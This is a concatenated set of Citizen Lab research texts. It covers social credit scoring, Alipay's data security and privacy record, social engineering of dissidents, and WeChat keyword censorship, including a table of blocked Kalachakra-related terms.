explaining big data initiatives as taking in “objective” measures of user data, partially because in cases where an indicator is inaccurate, it becomes difficult to dispute this point. One example from a recent Wall Street Journal article involves a woman who used her son’s subway pass and was fined for an act that, to an algorithm, would appear to have been theft. This minor incident raises concerns about the decontexualized way in which social credit scoring may be designed to operate. What, if any, legal remedy is available for far more consequential mistakes under a social credit system?\nThe state of the current experiments in this field raise many questions about user protections. Regarding user privacy, there has been little discussion of the implications of making individuals’ scores viewable to to others. Alipay offers a game in which friends can guess each other’s credit scores and reveal them to one another, for example. Beyond other users, external companies that provide special services to high credit score holders, and the app’s partnered government bureaus, with which third parties will Sesame Credit share data? The centralization of the data collection mechanisms for social credit make dang’an-like dossiers of individuals’ online and offline lives all the more portable, as several media reports have noted. What security procedures are in place to protect these repositories of valuable personal information? \nIn an irony that has plagued many a surveillance apparatus, the spread of a social credit system and its associated sensors, QR codes, and other trace-reading tools can create new security concerns separate from those it allegedly aims to reduce through near-ubiquitous monitoring of behavior. These new threats involve the ways in which credit score data can be forged, and the ends toward which fake credit scores may be used. The expedited security check at the Beijing airport for Sesame Credit users with high enough scores who are traveling on domestic flights provides one example of a situation where a falsified high score could enable someone to bypass more rigorous security checks, which can be a threat to national security from a skilled and determined enough actor. The more widely used the social credit system becomes and the greater the range of rewards it may provide high scorers, the more incentives for figuring out how to hack it will proliferate. Articles and threads about how to raise one’s credit scores are already on the rise, and it is still unclear how easy it may be to hack into a specific account and falsify information.\nAs detailed in a previous post, Alibaba has experienced data leaks from company employees as well as external hacks. It is imperative to question what precautions they are taking given that the rapid buildup of a social credit system will likely make the companies that are its stewards targets for data theft and extortion. Moreover, as a host of  data-collecting Internet of Things (IoT) devices are sold across China, granular capabilities to track citizens’ every move and draw from this information as a social credit input will only grow stronger, and requires work on the part of IoT manufacturers to address these issues. One development that has the potential to make the social credit companies more transparent has been the National Development and Reform Commission’s announcement that credit evaluation services will be opened up for foreign investment, which may at a minimum provide more information about how enterprise social credit scoring (for restaurants and local businesses) is conducted.\nThe final security and censorship-related concern we offer for consideration is the possibility of social credit and mobile finance access being blocked to penalize citizens for acts of protest, as merely one example. If both of these services become indispensable in one’s daily life, the possibility of government-sanctioned freezing of users’ accounts could pose major harms to civil liberties. As the rollout of the system progresses, it is important to keep in mind that although the algorithms that determine credit scores may quickly change in ways that users and researchers cannot perceive, the power of the state and the companies shaping the social credit system’s development is far more entrenched, and is ultimately responsible for the real-world outcomes the social credit system may produce.\n \n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\t\nBy: Shazeda Ahmed and Adrian Fong \nThis research series presents an in-depth examination of mobile payment systems, a rapidly evolving form of financial technology. We will provide an overview of how they are used in China–where they are taking off faster than anywhere else in the world–and what implications their security and data protection practices may have for millions of users, by presenting a case study on Alipay.\nMobile Payment Systems\nMobile payment systems (MPS) are transforming global consumption, with smartphone users increasingly relying on these applications for their daily transactions. Some of the most popular applications include Google Wallet, Apple Pay, and Alipay. They are used not only to transfer money between individuals but also to pay salaries and bills, and make cross-currency remittances. Non-bank entities, including Tencent and Alibaba, have relied on their existing broad consumer bases in areas such as e-commerce to expand into the mobile payments arena.\nMobile payment systems generally require users to sign up for an account using their phone numbers and bank account information. Aside from making and receiving payments, some MPS now store medical records for hospital bill payment. Through data collected from peer-to-peer transactions, companies can offer value-added services such as risk mitigation and consumer analytics. Collected payment data (e.g., how often a person receives money or how much that person regularly spends) can be analyzed and used for direct marketing purposes or sold to third parties. As more countries move to a cashless society model with businesses and even banks rejecting cash, MPS will be extremely important in the future. While these platforms make a host of interactions more convenient and efficient for users, they also carry risks involving the transfer, collection, and storage of one’s personal data. A substantial amount of personal data on one platform also raises the risks that these MPS will become an increasing target for law enforcement agencies looking to gain personal information for commercial, intelligence, national security, law enforcement, and anti-money laundering or terrorist financing purposes. China presents a complex and instructive case study of the ways in which highly concentrated mobile payment providers wield major control over troves of sensitive user data.\nMobile Payment Systems in China\nPerhaps the most striking example of swift, widespread adoption of mobile payments has occurred in China, where in 2015 Alipay (a subsidiary of Ant Financial, which was spun off by Alibaba) had approximately 450 million users and 68% market share, while Tencent’s Tenpay is growing quickly and has captured 20% of the domestic MPS market. Purchasing domestic and international travel tickets, booking doctor’s appointments, and hailing a taxi can now all be done from within an individual mobile payment app. The prevalence of MPS in China has enabled hospitals, public transportation systems, and even embassies to rely on them to serve users. These apps are expanding their payment and location-tracking services in Europe, Southeast Asia and other jurisdictions to cater to both Chinese tourists abroad as well as local users.\nFigure 1: “Alibank” feature within Alipay app, including ability to pay for airfare, hotels, trains, taxis, as well as domestic and international travel.\nThe speed with which MPS platforms have taken off in China has left the government racing to fill regulatory gaps, prompting questions about what kinds of top-down rules are being proposed to guarantee security and privacy in China’s MPS, and what consequences they may have for users and MPS-partnered companies in China and abroad. The question of actual enforcement of privacy laws, regulations, and policies also looms large in a state that is still struggling to devise an effective system for protecting data privacy. In light of recent Chinese government interest to harness the power of big data for pervasive societal surveillance and management, what types of information do MPS companies actually collect from their users and how do they use this information? What internal policies have they implemented to ensure that users’ data privacy rights are respected? How secure is this information? How is this information being shared with third parties, law enforcement agencies and government organizations (e.g., to detect money laundering and terrorist financing)?\nCase Study: Alipay\nAlipay is the most widely-used MPS app in China and the most ambitious in its overseas expansion. The app automatically rolls out new technical features often, and is participating in the pilot program to create a nationwide social credit system that uses data derived from the app to generate individuals’ credit scores.\nThe Alibaba Group is an e-commerce platform based in China, through which businesses and consumers can sell to and purchase from one another. Alipay was launched in 2004 as a payment service for The Alibaba Group, and describes itself as a provider of ‘payment processing and escrow services’ that can be used to process payments on Alibaba’s platforms. Most of the transactions on Alibaba’s platform use Alipay.\nAlthough Alipay was originally a subsidiary of Alibaba, which is incorporated in the Cayman Islands, it was spun off in 2011 into a separate entity under Ant Financial Services in order to comply with Chinese licensing rules that made it prohibitive for foreign-invested companies to operate non-bank payment companies in China. Alipay is now a domestic PRC-owned entity. Ant Financial Services entered into an agreement with Alibaba that governs the relationship between the parties, whereby Alipay provides payment services to Alibaba on preferential terms.\nIn 2016, Alipay stated that it was expanding into Europe to allow Chinese tourists overseas to pay for goods and services abroad. Sabrina Peng, president of Alipay International, stated that “The vision is targeting two billion people within next five to ten years, not only in China but other countries too.” In line with this aim, Alipay has launched an international version, available for users living outside of China. Alipay retains a separate Chinese domestic version for users in China.As the Citizen Lab has demonstrated in the report “One App, Two Systems: How WeChat uses one censorship policy in China and another internationally,” the separation of domestic versus international versions of a single Chinese app, with each possessing differing functionality that does not always draw attention to itself, is not a new phenomenon. The findings from that report raise the question of whether or not the Chinese version of Alipay is tracking Chinese users who travel abroad without notifying them that such monitoring is taking place.\nRetail Data Trail\nSome of the services Alipay has come to offer in China that make it so unique involve coordination with well-known foreign retailers and hotels, as well as with municipal Chinese governments. Chinese tourists in the United Kingdom, France, Germany, Thailand, Japan, and Taiwan can now find point of sale (POS) retailers in these countries that accept Alipay. The app geolocates the user and makes additional recommendations for nearby sightseeing. Upon leaving several European countries, Chinese tourists can now apply at customs for tax rebates on their Alipay-enabled purchases, with refunds being applied directly to their Alipay accounts.\nFigure 2: “The World is So Big” Alipay in-app feature, which includes discounts on duty-free purchases in South Korea and travel discounts for Singapore.\nThe data trail left by users’ transactions at home and abroad can paint a finely detailed portrait of how they spend their money and time. The extent to which Alipay shares such data with the Chinese government is troublingly unclear in light of the wealth of citizens’ data the company has acquired. Moreover, as Alipay and similar platforms become increasingly essential to users, the threat of government suspension of these accounts may arise. For example, the state could request that Alipay suspend accounts of activists and other individuals, effectively chilling free speech. Greater information from the MPS providers, such as through a transparency report, would be needed to inform users of the level of access and cooperation with state and law enforcement agencies. This kind of disclosure is highly unlikely to occur, especially as Alipay and similar social credit-dispensing services come to cooperate more closely with the Chinese government. As the “One App, Two Systems” WeChat report has shown, the “extraterritorial” control that the state can wield through these apps over Chinese citizens abroad has become far too valuable to the Chinese government to be relinquished.\nNew and Increasingly Personalized Services\nNon-traditional services that Alipay has begun to offer include hospital bill payment, student loan disbursement and management, and a new form of health insurance for “good samaritans.” Alipay has collaborated with China Development Bank (the state’s policy bank) to offer interest-free loans to college students, with Alipay again managing the application and repayment processes. At hospitals that have paired with Alipay, the app’s “pay after treatment” function allows those who lack health insurance to pay their medical bills. There are plans to partner with health insurance providers to enable those who do have insurance to simply pay the remaining balance of their medical visits. Alipay has also partnered with hospitals to make health services more efficient and “[p]atients can link their Alipay account to the hospital’s service, allowing them to register online, pick up medical reports and of course pay using their Alipay wallet.”\nFigure 3: “Ant [Financial] Insurance Services”, an in-app Alipay feature including automobile, travel, health, and financial insurance options.These examples raise concerns about the kinds of personal data Alipay collects and how such data could be used. For example, the collected health records could be accessed by affiliated Alibaba insurance companies, affecting the user’s ability to obtain health insurance. Moreover, the in-app student loan and health services are normalizing the sharing of highly personal data,  with significant digital security ramifications.\nRisk Environment Applicable to Alipay\nHow is the data secured?\nGiven the unprecedented scope of the data collection in the new features Alipay has begun to offer and related potential security concerns, it is critical to reflect upon past incidents in which the company’s security measures have lapsed. It is worth noting that in 2011 when Alipay was still being used on PCs, the company had partnered with UC Browser, whose security flaws the Citizen Lab has investigated and publicized. On December 28, 2011, it was reported that 15 to 25 million Alipay accounts had been hacked. The company’s public statement was that only account IDs, rather than passwords and financial information, were stolen. \nIn January 2014, the company apologized for an incident in which a former Alipay employee downloaded 20 GB of user data including Alipay usernames, contact information, and purchases, which he and accomplices then sold to competitors. Also in 2014, the industry journal China Information Security [中国信息安全] carried an article explaining in detail the process through which a hacking group made a successful spoofing attempt that inserted malware into what looked like a genuine Alipay security update. This spoofing enabled them to “invade websites and engage in two types of mobile phone phishing to obtain users’ real names, ID numbers, Alipay account passwords, other information, and finally their money.” \nIn 2015 Caixin reported that an Alipay user had posted on Sina Weibo that his account had, unbeknownst to him, been used to authorize payments to five different e-commerce websites. At around the same time, in comments on this post, other users claimed to have found the same issue with their accounts, and stated that they needed to contact Alipay to remove these erroneous charges. It was unclear whether or not this occurred as a result of a hack, with an Alipay spokesperson simply referring to it as a “design flaw.” The same Caixin article noted that Alipay has had friction with the central bank and other Chinese regulators before, given the company’s penchant for adopting new technological features ahead of the pace at which the state can verify their security. In early 2016 there were posts on the Chinese version of Quora, named Zhihu, alleging that the Alipay app has secretly taken photographs of users as well as downloaded and executed unauthorized files. In some cases screenshots of these processes are provided. Finally, on January 10, 2017 Alipay confirmed on their official Sina Weibo account that they had addressed a major security issue in which users could reset their passwords by identifying their recent purchases and people they knew, a feature that enabled friends to access without authorization one another’s accounts. The company’s wholly inadequate solution was to only enable these forms of user verification for password reset from an individual user’s personal phone. The history of Alipay’s data breaches and the company’s cavalier attitude toward user security  are troubling given the scope and amount of personal user data the app collects to conduct financial and other transactions.  \nQR Codes and NFC\nMany of the clashes Alipay and other mobile payment services in China have had with regulators involved new technical features that the government has not deemed to be fully secure. For example, Alipay began to use quick response (QR) codes for users to make payments in taxis and at POS merchants in 2012. In March 2014, the People’s Bank of China (PBoC), China’s central bank, ordered Tencent and Alibaba to suspend the use of QR codes and virtual credit cards for payment due to concerns over their security vulnerabilities and the state’s inability to regulate them. Risks cited included the ease with which virtual credit cards can be duplicated, prior cases of identity and financial theft made through the use of QR code payments, and the ability to link barcodes with phishing websites. At the time the government also expressed the fear that the use of virtual credit cards could undermine the shift toward nationwide real-name registration. It was also during this period that state-owned banks imposed caps on the amounts of money that third-party payment tools could allow users to transfer. A Xinhua article about the suspension noted that there had been past incidents in which users’ personal information and funds were stolen during transactions involving QR codes. Feng Xinya of the PBoC stated that the bank “asked the relevant online payment service providers to submit documents analyzing the security of their virtual credit card and QR code payment services… we will undertake a security risk assessment,” and that the QR codes that merchants used could easily be altered and instead used to link to phishing websites. The government additionally placed restrictions on how much money users could spend within mobile payment apps to curtail risk. State regulators ultimately offered no clear explanation for why payment apps were ultimately allowed to resume use of this technology. \nThe temporary suspension of QR codes encouraged payment apps to pursue installation of the infrastructure to use near-field communications (NFC) instead, which involves equipping smartphones and vendors with the technology and an understanding of how the system uses magnetic induction for devices within close physical range of one another to communicate.  At present it appears that the major Chinese mobile payment applications use both QR codes and NFC. \nStudies on security and privacy issues of QR codes and readers provide a sense of some of the concerns the Chinese government may have initially had. One study of popular QR code reader apps on Android and iOS phones found that “many QR code scanners relay user data back to developers regarding the content scanned, the time the item was scanned, and even the global positioning system (GPS) coordinates of the smartphone at the time, as well as numerous other data elements which may be of interest to the particular application developer.” Were research on the security of Alipay’s QR code scanning functions to be conducted in the future, researchers could begin by questioning if the app’s readers are capable of identifying QR codes that had been tampered with in order to lead users to malicious websites that sometimes ask for credit card information. Does Alipay have a black- or whitelist system in place to prevent repeat attempts at phishing? Although Alipay presumably collects the same data by other means to provide location-based and additional services, it is still important to question the security of the in-app QR code readers that conduct millions of transactions per day. \nBiometrics\n\nIt is likely that regulatory battles between mobile payment apps and the government will continue to crop up, especially regarding new capabilities such as biometric payment authentication. In 2015 Alipay’s own Chief Security Architect Xu Tian stated that “through use of fingerprint and facial recognition, among other forms of biometric authentication, we will heighten the user’s operating experience and sense of security, largely raising the threshold for account theft and the cost of attacks, and effectively lowering the user’s risk factor.” Back in 2014, Alipay collaborated with Huawei to provide payment services in which users’ fingerprints could verify payments on the latter’s Ascend Mate 7 phone, a partnership that may raise eyebrows given concerns about Huawei’s possible connections to China’s military and its dealings with sanctioned states. Months later, the fingerprint authentication system was extended to iPhones as well. The following year, Alibaba’s Jack Ma demonstrated the use of a potential new Alipay feature known as “Smile to Pay,” in which a user can take a selfie that uses facial recognition to authenticate a payment. According to Caixin, in March 2015 “the People’s Bank of China has already started working on Alibaba’s request, in the wake of a central bank meeting with online technology experts in January. The central bank has also started crafting a regulatory framework that would open the door to experimental programs that test the security and usefulness of biometrics for Internet users who want to open bank accounts online.” In May 2015, the central bank declared that the security of the transmission of biometric data had to be evaluated, and a technical standard for its use determined, before it could be used in traditional banks. How this reflects upon mobile payment apps and other non-traditional banking services is as yet unclear.\nInvesting in Security\nIt is important to also consider Alipay’s previous and ongoing efforts to keep users secure. According to Xinhua, “In 2013, Alipay blocked about 150,000 phishing websites, and assisted the police against 16 network gangs with more than 10 million yuan involved, resulting in 35 arrests.” In April 2014 Alipay set up a 40 million RMB fund that the company said would be used to cooperate with the government, banks, other e-commerce companies, and security software providers to protect users’ security and data. The vice president of Alibaba’s Microfinance Service Group has said that this fund will be focused on “anti-money laundering, anti-malware, and user information protection.” Alipay also started a 10 million yuan fund with Shanghai 863 Information Security Industry Park Co. Ltd in 2014, to work toward improvement of information security. The results of these investments have yet to be publicized, as is the case with Alipay’s 2014 announcement that it would launch a program to “share its risk control capacity with all organizations involved in the Internet security industry… to help them improve their capability and speed up their research and development process.” It remains unclear how such a program would operate in practice, or what measurable contributions Alipay has made to improving user data protection through any of these recent investments.\nConclusion\nAlipay exemplifies how MPS are providing services that have the potential to collect highly sensitive personal data. The speed with which MPS platforms have taken off in China has left unanswered many questions of how users’ data privacy and security are protected. The success of Alipay in China may inspire the adoption of similar applications elsewhere in the world, and therefore merits closer attention from the security community and policymakers alike. As fintech in China transforms models of application ecosystems into becoming more centralized, single-stop hubs for all of one’s needs, it is critical to question what the companies who are the custodians of hundreds of millions of citizens’ data are doing to ensure it is being acquired and used lawfully. Previous data breaches and lapses in Alipay’s security suggest a strong need for improved security practices.

    "text": "\n\t\t\t\tCitizen Lab Senior Research Fellow Bill Marczak has co-authored a paper titled “Social Engineering Attacks on Government Opponents: Target Perspectives,” along with Vern Paxson of UC Berkeley. The paper explores the targeting of civil society organizations and activists with surveillance. These efforts often involve an element of social engineering – an attempt to convince a target to open a malicious file or link, which is included in a message. This is often done by posing as a friend, familiar organization, or a new contact with relevant information. The paper explores this process, and highlights the vulnerabilities of likely targets.\nAbstract:\n\n\n\n\nNew methods of dissident surveillance employed by repressive nation-states increasingly involve socially engineering targets into unwitting cooperation (e.g., by convincing them to open a malicious attachment or link). While a fair amount is understood about the nature of these threat actors and the types of tools they use, there is comparatively little understood about targets’ perceptions of the risks associated with their online activity, and their security posture. We conducted in-depth interviews of 30 potential targets of Middle Eastern and Horn of Africa-based governments, also examining settings and software on their computers and phones. Our engagement illuminates the ways that likely targets are vulnerable to the types of social engineering employed by nation- states.\n\n\n\n\nRead the full paper.\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tBy Masashi Crete-Nishihata, Jeffrey Knockel, and Lotus Ruan\nMedia Coverage: Phayul, Voice of America Tibetan\nSummary\nFrom January 2 to 13 2017, His Holiness the Dalai Lama is holding a popular Tibetan Buddhist teaching called Kalachakra in Bodh Gaya, India, which is the site where the Buddha is believed to have gained enlightenment. Over 200,000 people from around the world are expected to attend this year’s ritual. Increased restrictions from the government of China has barred Tibetans in Tibet from attending the teachings. This report documents blocking of Kalachakra-related keywords on WeChat revealing how restrictions around the ritual extend online.\nChinese Government Restrictions Tighten over Kalachakra\nReportedly, nearly 7,000 Tibetans inside Tibetan areas who planned to make the pilgrimage to Kalachakra are facing restrictions from the government of China that are preventing their attendance. These restrictions include the confiscation of passports, blocking passengers from boarding aircraft, and ordering Tibetans who had traveled to India and Nepal in November with plans to attend the event to promptly return to Tibetan areas. Tibetans who were ordered to return were reportedly threatened with reprisals against their families if they disobeyed. Chinese authorities in Tibetan areas have called Kalachakra an “illegal” gathering. An official notice circulated in Dechen in Yunnan province obtained by Radio Free Asia, prohibited any involvement in the event or sharing of information about Kalachakra over the Internet or social media and warned “Other related activities, such as organizing celebrations in support of the Kalachakra, are also forbidden. Anyone engaging in these acts will be in violation of Article 55 of China’s Public Security Law and will face severe consequences.” The notice explains that any violations will be met with police detention of 10 to 15 days or jail sentences of up to five years for serious infractions. Another notice circulated in December warned that anyone found to have participated in Kalachakra will have their passport and ration card confiscated upon return and if the persons are monks or nuns they will lose their right to study Tibetan Buddhism.\nXu Zhitao, deputy director of the bureau of the Tibet question at the United Front Work Department of the Communist Party of China Central Committee called the ritual a “political tool” and claimed the Dalai Lama will use it to  propagate ideas of “hating the Chinese government.” The Communist Party of China views the Dalai Lama as a “splittist” who threatens its power. The International Campaign for Tibet described the tightened restrictions as the most systematic crackdown to date on a teaching in exile given by His Holiness the Dalai Lama. In response to the tightened restrictions, the Dalai Lama sent a message to Tibetans, “Distance cannot dampen the sacred ties between a Lama and a disciple. You can all pray from the far-flung areas in Tibet and I assure you that you will receive the Kalachakra empowerment”.\nFigure 1: His Holiness the Dalai Lama conducts a Kalachakra teaching in Bodh Gaya. Photo credit: Lhakpa Kyizom\nKalachakra Blocked on WeChat\nWeChat is the most popular chat app in China and has gained wide adoption by Tibetans around the world. Operating a chat application in China requires following laws and regulations on content control and monitoring. To comply with these regulations, WeChat enables keyword filtering for users with accounts registered to mainland China phone numbers. Censorship of keywords is not transparent and no notice is given to a user if their message is blocked. A message with a keyword that is blocked by WeChat simply does not appear. WeChat has higher levels of keyword blocking in group chats (which can reach up to 500 users) than one-to-one chat. The greater attention to group chat may be due to the semi-public sphere feature of online discussion groups. Messages can reach wider audiences in group chat and potentially be used to organize protests and other public mobilizations, which may be why it is subject to a higher level of scrutiny.\nIn previous research we showed that Tibet-related content targeted for censorship on WeChat. There have also been cases of Tibetans being arrested for sharing chat messages, songs, and photos on WeChat with content related to the Dalai Lama and Tibetan culture that Chinese authorities alleged carried “anti-China” sentiments.\nWeChat performs censorship on the server-side. When you send a message it passes through a remote server that contains rules for implementing censorship. If the message includes a keyword that has been targeted for blocking, the message will not be sent. Documenting censorship on a system with a server-side implementation such as WeChat’s requires devising a sample of keywords to test, running those keywords through the app, and recording the results.\nOur previous work found that censorship on WeChat is dynamic and keyword lists are updated in reaction to news events. We conducted tests to determine if keywords related to news events were blocked by collecting front page articles from international and independent news media websites (e.g., BBC Chinese, New York Times Chinese, Radio Free Asia Mandarin, Voice of Tibet, Deutsche Welle Chinese). We copy the text of the article into a chat between an account registered to a mainland China phone number and accounts registered to international phone numbers. If we found the article was censored we then reduce the text in the article down to the minimum number of keywords required to trigger censorship. From this initial set of keywords we then tested other related keywords in different languages.\nThe tests revealed a number of keywords related to Kalachakra blocked on WeChat in English, Chinese, Tibetan and Hindi in group chat mode when using an account registered to a Chinese phone number.\nWeChat censors single keywords and combination of keywords. For keyword combinations, blocking is triggered if a set of keywords are used together in a message. If the same keywords are sent individually the message is not blocked. Table 1 provides a breakdown of all the Kalachakra and Tibet related keywords we found blocked on WeChat in this round of testing.\n\n\n\nDate Keyword Tested \nKeyword\nTranslation\nLanguage\n\n\n2017-01-03\nKalachakra+Dalai Lama+Tibetan\nn/a\nEnglish\n\n\n2017-01-03\n达赖喇嘛 + 1月3日 + 金刚灌顶法会\nDalai Lama + January 3 + Kalachakra Initiation\nSimplified Chinese\n\n\n2017-01-03\n達賴喇嘛 + 1月3日 + 金剛灌頂法會\nDalai Lama + January 3 + Kalachakra Initiation\nTraditional Chinese\n\n\n2017-01-04\n达赖喇嘛 + 菩提伽耶 + 金刚灌顶法会\nDalai Lama + Bodh Gaya + Kalachakra Initiation\nSimplified Chinese\n\n\n2017-01-04\n達賴喇嘛 + 菩提伽耶 + 金剛灌頂法會\nDalai Lama + Bodh Gaya + Kalachakra Initiation\nTraditional Chinese\n\n\n2017-01-04\n至高无上的领袖 + 达赖喇嘛尊者\nSupreme Leader + His Holiness Dalai Lama\nSimplified Chinese\n\n\n2017-01-03\nགོང་ས་མཆོག\nDalai Lama\nTibetan\n\n\n2017-01-04\nबोधगया\nBodh Gaya\nHindi\n\n\n2017-01-03\nबो\nBo. First character in बोधगया (“Bodh Gaya”)\nHindi\n\n\n2017-01-03\nया\nYa. Last character in बोधगया (“Bodh Gaya”)\nHindi\n\n\n\nTable 1: Kalachakra and Tibet related keywords found blocked on WeChat.\nWe found the keyword combination of “Kalachakra” + “Dalai Lama” + “Tibetan” blocked. Figure 2 shows a group chat conversation between a user with a China account and users with international accounts. If the user with the China account sends messages with the keywords individually, the message is received by the other users, but if the China account user sends a message with all three keywords used together in a sentence the message is not displayed.\nFigure 2: A user with a China account attempts to send a message with the keyword combination “Kalachakra” + “Dalai Lama” + “Tibetan” in a group chat to users with International accounts and is blocked. If the keywords are sent individually they are received.\nWe found other keyword combinations in Chinese including 达赖喇嘛 (Dalai Lama) + 1月3日 (January 3) + 金刚灌顶法会 (Kalachakra Initiation). Figure 3 shows the keywords can be sent individually, but are blocked if all the keywords are present in one message as in our example: “时轮金刚灌顶法会在1月3日举行，达赖喇嘛将进行讲学” (On January 3, the Kalachakra Initiation will start. The Dalai Lama will do a teaching).\nFigure 3: A user with a China account attempts to send a message with the keyword combination “达赖喇嘛 + 1月3日 + 金刚灌顶法会” in a group chat to users with International accounts and is blocked. If the keywords are sent individually they are received.\nIn the Tibetan language we found reference to the Dalai Lama blocked (e.g, གོང་ས་མཆོག “Dalai Lama”), but Kalachakra in Tibetan (དུས་འཁོར་དབང་ཆེན་) was not blocked. Figure 4 shows a conversation between a user with a China account and users with International accounts. Messages that contain the keyword གོང་ས་མཆོག  are not sent.\nFigure 4: A user with a China account attempts to send a message with the keyword “གོང་ས་མཆོག” in a group chat to users with International accounts and is blocked.\nWe also found the keyword Bodh Gaya (the site of Kalachakra) in Hindi blocked (बोधगया). If the first and last characters of the keyword (“बो ” and “या”) are used individually the message is also blocked even though the characters alone are not meaningful.\nConclusion\nChinese social media platforms routinely and systematically censor Tibet-related content. Previous work has documented the extent of this censorship on microblogs, video sharing sites, live streaming apps, and chat apps (including WeChat). The blocking of Kalachakra related keywords demonstrates that censorship on WeChat is dynamic and keyword lists are updated in response to current events. Tibetans with WeChat accounts registered to mainland China phone numbers who try to communicate about Kalachakra may find themselves blocked, showing that the restrictions to the Tibetan community offline are mirrored online.\nAcknowledgments\nSpecial thanks to Tibet Action Institute for assistance and to Lhakpa Kyizom for permission to use photography.\n\n\t\t\t\t\n\t\t\t",

    "description": "Read a blog post on the report from Citizen Lab Director  Ron Deibert.",
    "text": "\n\t\t\t\tBy: Lotus Ruan, Jeffrey Knockel, Jason Q. Ng, and Masashi Crete-Nishihata\n阅读报告中文摘要\nRead a blog post on the report from Citizen Lab Director  Ron Deibert.\nMedia coverage: Bloomberg, Reuters, Wall Street Journal,The Globe and Mail, Quartz.\nKey Findings\n\nKeyword filtering on WeChat is only enabled for users with accounts registered to mainland China phone numbers, and persists even if these users later link the account to an International number.\n\n\nKeyword censorship is no longer transparent. In the past, users received notification when their message was blocked; now censorship of chat messages happens without any user notice.\n\n\nMore keywords are blocked on group chat, where messages can reach a larger audience, than one-to-one chat.\n\n\nKeyword censorship is dynamic. Some keywords that triggered censorship in our original tests were later found to be permissible in later tests.  Some newfound censored keywords appear to have been added in response to current news events.\n\n\nWeChat’s internal browser blocks China-based accounts from accessing a range of websites including gambling, Falun Gong, and media that report critically on China. Websites that are blocked for China accounts were fully accessible for International accounts, but there is intermittent blocking of gambling and pornography websites on International accounts.\n\nIntroduction\nWeChat, (Weixin 微信 in Chinese), is the dominant chat application in China and fourth largest in the world, with 806 million monthly active users.\nWeChat encompasses more than just text, voice, and video chat; it includes a rich set of features such as gaming, mobile payments, and ride hailing, which make it more of a lifestyle platform than a mere chat app. It is estimated that Chinese users spend a third of their mobile online time on WeChat and typically return to the app ten times a day or more. WeChat is owned and operated by Tencent, one of China’s largest technology companies.\nOperating a chat application in China requires following laws and regulations on content control and monitoring. Accordingly, the popularity of WeChat has also been met with suspicions of surveillance and media reports of censorship.  Despite these concerns, there is limited technical research into the operation and scale of content monitoring and filtering. In this report, we provide the first systematic analysis of keyword censorship and URL filtering on WeChat to determine how the app filters content and the type of content that is blocked.\nWe found that keyword filtering is enabled on WeChat for users with accounts registered to mainland China phone numbers. Filtering remains enabled even if users later link their account with a non-mainland China number, which means that users with accounts registered to mainland China will remain under censorship regardless if they travel or unlink their Chinese phone number from the account. Differentiating content access based on user registration seemingly creates a “one app, two systems” model of censorship.\nWeChat performs censorship on the server-side. When you send a message it passes through a remote server that contains rules for implementing censorship. If the message includes a keyword that has been targeted for blocking, the message will not be sent. Documenting censorship on a system with a server-side implementation such as WeChat’s requires devising a sample of keywords to test, running those keywords through the app, and recording the results.\nWe used a sample of keywords found blocked on other apps used in China and systematically tested that sample in two modes: one-to-one chat and group chat. We found a greater number of keywords blocked on group chat compared to one-to-one chat, which suggests that communications on group chat are specifically targeted, potentially because group chats can reach a larger number of users.\nIn both chat modes, users are no longer presented with a warning message when they enter blocked keywords, as indicated by previous reports. This change means there is no feedback to users that censorship has occured making the restrictions on WeChat less transparent. Censored keywords spanned a range of content, including current events, politics, and social issues.\nIn addition to keyword censorship, WeChat implements a URL filtering system in its built-in browser, which uses different lists of blacklisted and whitelisted websites for China and International accounts. To sample which URLs WeChat censors, we used a script to automatically test the Alexa Top One Million list of websites using both China and International accounts.\nWe found that 41 of the websites we tested blocked only on accounts registered with mainland Chinese phone numbers. Moreover, every site that is uniquely blocked on China accounts is fully accessible on International accounts, meaning that international users can successfully access the same URLs with WeChat’s internal browser. However, we did find intermittent blocking of other gambling and pornography websites on International accounts.\nWe proceed by providing an overview of the legal and regulatory system in China, past work on censorship on WeChat, report our new results, and conclude with a discussion on the implications of our findings.\nLegal and Regulatory Environment\nWeChat thrives on the huge user base it has amassed in China, but the Chinese market carries unique challenges. Any Internet company operating in China is subject to laws and regulations that hold companies legally responsible for content on their platforms. Companies are expected to invest in staff and filtering technologies to moderate content and stay in compliance with government regulations. Failure to comply can lead to fines or revocation of operating licenses. In 2010, China’s State Council Information Office (SCIO) published a major government-issued document on its Internet policy. It includes a list of prohibited topics that are vaguely defined, including “disrupting social order and stability” and “damaging state honor and interests.” In late-May 2014, China’s State Internet Information Office (SIIO), Ministry of Public Security (MPS), and the Ministry of Industry and Information Technology (MIIT) jointly launched a month-long campaign targeting Chinese instant messaging (IM) services in a bid to clean up “illegal and harmful information” and to fend off “hostile forces at home and abroad.”\nIn recent years, WeChat has faced increased regulatory pressures. WeChat offers a microblogging feature called “Public Accounts” that allows certain users to publish daily posts. On March 13, 2014, Tencent shut down nearly 40 Public Accounts without giving any prior notice. Popular Public Accounts that discuss current affairs and politics, such as the Consensus Website (共识网), Truth Channel (真话频道), Luo Changping (罗昌平), and Elephant Magazine (大象工会), were shut down overnight. Tencent issued a statement explaining that it “strictly prohibits publishing pornographic, vulgar, violent, bloody, political rumors and any illegal content.” The company said the action was “part of the commitment to providing quality user experience on Weixin in China,”  and that it would “continually review and take measures” on suspicious content.\nIn August 2014, the SIIO announced rules on instant messaging tools, requiring service providers to obtain “Internet news service qualifications,” users to authenticate their identities before registering, public accounts owners to undergo “examination and verification” by the companies, and store this information on file with the “controlling department for Internet information and content.”\nThis strict regulatory environment has led to suspicions that communications on WeChat may be monitored. There have also been cases of Tibetans being arrested for sharing chat messages, songs, and photos on WeChat with content related to the Dalai Lama and Tibetan culture that Chinese authorities alleged carried “anti-China” sentiments.\nBeyond the Chinese market, WeChat has made considerable efforts to grow its user base internationally. Tencent launched advertising campaigns targeting foreign markets, recruiting football star Lionel Messi and Bollywood actors to endorse the app. However, the impact of these efforts has been questionable. Tencent has never disclosed how many active users it has outside of China, but WeChat has yet to make the same impact in other countries as it has in its home market. Some commentators speculate that WeChat has not enjoyed the same success internationally because outside of China the application does not have the same rich set of features, such as mobile payments and taxi hailing, that make it a compelling platform for users within China.\nMarket growth outside of China has also been hampered by incidents that remind international users of the restrictions WeChat faces at home. In January 2013, media reported that WeChat users outside of China experienced censorship of chat messages that contained the keywords “法轮功” (“Falun Gong”) or “南方周末” (“Southern Weekend”), a Guangzhou-based liberal newspaper in China (see Figure 1). Tencent responded with a statement that claimed a technical error had enabled keyword filtering for international users temporarily and that immediate actions would be taken to rectify the issue.\nFigure 1: Screenshots from media reports show international users experiencing keyword censorship on WeChat. Source: Tech in Asia and The Next 